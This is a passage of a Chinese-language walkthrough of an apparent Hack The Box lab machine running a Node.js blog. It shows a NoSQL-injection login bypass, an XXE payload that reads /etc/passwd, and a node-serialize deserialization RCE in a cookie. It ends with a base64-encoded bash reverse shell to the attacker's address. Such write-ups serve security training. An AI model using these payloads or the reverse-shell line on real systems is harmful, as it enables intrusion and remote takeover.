class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>确实，是可以校验，构造个payload：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/login</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.11.139:5000<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>46<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.10.11.139:5000<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.11.139:5000/login<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-bash">&#123;<span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: &#123;<span class="hljs-string">&quot;<span class="hljs-variable">$ne</span>&quot;</span>: <span class="hljs-string">&quot;password&quot;</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>页面会发生一些变化：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514230005119.png" alt="image-20220514230005119"  /><h4 id="XXE："><a href="#XXE：" class="headerlink" title="XXE："></a>XXE：</h4><p>一个新建，一个上传，一个编辑，先随便上传一个文件，啥类型也能上传，但是服务端不收，还报错：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514230417472.png" alt="image-20220514230417472"  /><p>要上传XML类型的文件，可以随便写一个试试：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">post</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>test see hello<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">markdown</span>&gt;</span><br>                This is a test post.<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">markdown</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">post</span>&gt;</span><br></code></pre></td></tr></table></figure><p>到了文章编辑的地方：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514230653414.png" alt="image-20220514230653414"  /><p>看起来是基于xml解析的，或许我可以尝试XXE读取一些文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">post</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>test Post<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Read File<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">markdown</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">markdown</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">post</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin<br>syslog:x:104:110::/home/syslog:/usr/sbin/nologin<br>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin<br>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false<br>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin<br>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin<br>pollinate:x:110:1::/var/cache/pollinate:/bin/false<br>usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin<br>sshd:x:112:65534::/run/sshd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>admin:x:1000:1000:admin:/home/admin:/bin/bash<br>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false<br>mongodb:x:109:117::/var/lib/mongodb:/usr/sbin/nologin<br></code></pre></td></tr></table></figure><p>确实读到了，可以尝试去读取一下SSH密钥，能登录的用户好像也没几个，但是我失败了，只要我尝试读取密钥就会报错。看起来确实是要我利用XXE做些什么事，但是又不想我这么简单，或是我可以试着让服务器报错，看能否得到些什么，我可以把json格式破坏掉，让服务器读取不了我提交的字段参数：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/login</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.11.139:5000<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>18<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.10.11.139:5000<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.11.139:5000/login<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p>会返回给我这样的错误信息：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Error<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>SyntaxError: Unexpected end of JSON input<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> <span class="hljs-symbol">&amp;nbsp;</span> <span class="hljs-symbol">&amp;nbsp;</span>at JSON.parse (<span class="hljs-symbol">&amp;lt;</span>anonymous<span class="hljs-symbol">&amp;gt;</span>)<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> <span class="hljs-symbol">&amp;nbsp;</span> <span class="hljs-symbol">&amp;nbsp;</span>at parse (/opt/blog/node_modules/body-parser/lib/types/json.js:89:19)<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> <span class="hljs-symbol">&amp;nbsp;</span> <span class="hljs-symbol">&amp;nbsp;</span>at /opt/blog/node_modules/body-parser/lib/read.js:121:18<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> <span class="hljs-symbol">&amp;nbsp;</span> <span class="hljs-symbol">&amp;nbsp;</span>at invokeCallback (/opt/blog/node_modules/raw-body/index.js:224:16)<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> <span class="hljs-symbol">&amp;nbsp;</span> <span class="hljs-symbol">&amp;nbsp;</span>at done (/opt/blog/node_modules/raw-body/index.js:213:7)<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> <span class="hljs-symbol">&amp;nbsp;</span> <span class="hljs-symbol">&amp;nbsp;</span>at IncomingMessage.onEnd (/opt/blog/node_modules/raw-body/index.js:273:7)<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> <span class="hljs-symbol">&amp;nbsp;</span> <span class="hljs-symbol">&amp;nbsp;</span>at IncomingMessage.emit (events.js:412:35)<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> <span class="hljs-symbol">&amp;nbsp;</span> <span class="hljs-symbol">&amp;nbsp;</span>at endReadableNT (internal/streams/readable.js:1334:12)<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> <span class="hljs-symbol">&amp;nbsp;</span> <span class="hljs-symbol">&amp;nbsp;</span>at processTicksAndRejections (internal/process/task_queues.js:82:21)<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>看起来我提交的参数让后端代码出问题了，而它也显示出了绝对路径，我可以通过XXE把他们都读出来，但是我都读不出来：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>Express<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>144<br><span class="hljs-attribute">ETag</span><span class="hljs-punctuation">: </span>W/&quot;90-v0DoTdXwQk7iInwC6sdbQSWTk3E&quot;<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Sat, 14 May 2022 19:40:48 GMT<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml">Invalid XML Example: <span class="hljs-tag">&lt;<span class="hljs-name">post</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Example Post<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Example Description<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">markdown</span>&gt;</span>Example Markdown<span class="hljs-tag">&lt;/<span class="hljs-name">markdown</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">post</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h4 id="Nodejs反序列化："><a href="#Nodejs反序列化：" class="headerlink" title="Nodejs反序列化："></a>Nodejs反序列化：</h4><p>或许我可以读一下nodejs的配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/opt/blog/server.js<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> mongoose = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mongoose&#x27;</span>)<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Article</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./models/article&#x27;</span>)<br><span class="hljs-keyword">const</span> articleRouter = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./routes/articles&#x27;</span>)<br><span class="hljs-keyword">const</span> loginRouter = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./routes/login&#x27;</span>)<br><span class="hljs-keyword">const</span> serialize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;node-serialize&#x27;</span>)<br><span class="hljs-keyword">const</span> methodOverride = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;method-override&#x27;</span>)<br><span class="hljs-keyword">const</span> fileUpload = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-fileupload&#x27;</span>)<br><span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>)<br><span class="hljs-keyword">const</span> cookie_secret = <span class="hljs-string">&quot;UHC-SecretCookie&quot;</span><br><span class="hljs-comment">//var session = require(&#x27;express-session&#x27;);</span><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()<br><br>mongoose.<span class="hljs-title function_">connect</span>(<span class="hljs-string">&#x27;mongodb://localhost/blog&#x27;</span>)<br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>)<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;))<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">methodOverride</span>(<span class="hljs-string">&#x27;_method&#x27;</span>))<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">fileUpload</span>())<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>());<br><span class="hljs-comment">//app.use(session(&#123;secret: &quot;UHC-SecretKey-123&quot;&#125;));</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">authenticated</span>(<span class="hljs-params">c</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> c == <span class="hljs-string">&#x27;undefined&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br><br>    c = serialize.<span class="hljs-title function_">unserialize</span>(c)<br><br>    <span class="hljs-keyword">if</span> (c.<span class="hljs-property">sign</span> == (crypto.<span class="hljs-title function_">createHash</span>(<span class="hljs-string">&#x27;md5&#x27;</span>).<span class="hljs-title function_">update</span>(cookie_secret + c.<span class="hljs-property">user</span>).<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)) )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    &#125;<br>&#125;<br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> articles = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Article</span>.<span class="hljs-title function_">find</span>().<span class="hljs-title function_">sort</span>(&#123;<br>        <span class="hljs-attr">createdAt</span>: <span class="hljs-string">&#x27;desc&#x27;</span><br>    &#125;)<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;articles/index&#x27;</span>, &#123; <span class="hljs-attr">articles</span>: articles, <span class="hljs-attr">ip</span>: req.<span class="hljs-property">socket</span>.<span class="hljs-property">remoteAddress</span>, <span class="hljs-attr">authenticated</span>: <span class="hljs-title function_">authenticated</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">auth</span>) &#125;)<br>&#125;)<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;/articles&#x27;</span>, articleRouter)<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, loginRouter)<br><br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>反序列化unserialize，那它反序列化的对象，应该是cookie：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%7</span>B<span class="hljs-variable">%22</span>user<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>admin<span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>C<span class="hljs-variable">%22</span>sign<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%2223</span>e<span class="hljs-number">112072945418601</span>deb<span class="hljs-number">47</span>d<span class="hljs-number">9</span>a<span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>de<span class="hljs-number">8</span><span class="hljs-variable">%22</span><span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><p>进行url解码：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;sign&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;23e112072945418601deb47d9a6c7de8&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>nodejs反序列化，我之前写过<a href="https://worldisend.com/posts/aaa3e92c6165/">一篇靶机</a>，可以先验证下是否能利用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-string">&quot;rce&quot;</span>:<span class="hljs-string">&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;ping -c 1 10.10.16.4&#x27;, function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;</span>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sudo tcpdump -i tun0 icmp and src 10.10.11.139<br></code></pre></td></tr></table></figure><p>还要进行url编码：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.11.139:5000<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>auth=%7b%22%72%63%65%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%28%29%7b%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%70%69%6e%67%20%2d%63%20%31%20%31%30%2e%31%30%2e%31%36%2e%34%27%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%7d%29%3b%7d%28%29%22%7d<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Set-GPC</span><span class="hljs-punctuation">: </span>1<br></code></pre></td></tr></table></figure><p>能监听到icmp流量包，漏洞确实存在：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sudo tcpdump -i tun0 icmp and src 10.10.11.139<br>tcpdump: verbose output suppressed, use -v[v]... <span class="hljs-keyword">for</span> full protocol decode<br>listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes<br>00:11:30.033721 IP nodeblog.htb &gt; 10.10.16.4: ICMP <span class="hljs-built_in">echo</span> request, <span class="hljs-built_in">id</span> 1, <span class="hljs-built_in">seq</span> 1, length 64<br></code></pre></td></tr></table></figure><h4 id="获取user-shell："><a href="#获取user-shell：" class="headerlink" title="获取user shell："></a>获取user shell：</h4><p>反弹shell的时候出现了些意外，估计是传输过程中数据被破坏了，可以进行一下编码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.4/9001 0&gt;&amp;1&#x27;</span> | <span class="hljs-built_in">base64</span><br>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzkwMDEgMD4mMQo=<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<span class="hljs-string">&quot;rce&quot;</span>:<span class="hljs-string">&quot;_$$ND_FUNC$<span class="hljs-variable">$_function</span>()&#123;require(&#x27;child_process&#x27;).exec(&#x27;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzkwMDEgMD4mMQo=|base64 -d |bash&#x27;, function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;</span>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.11.139:5000<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: 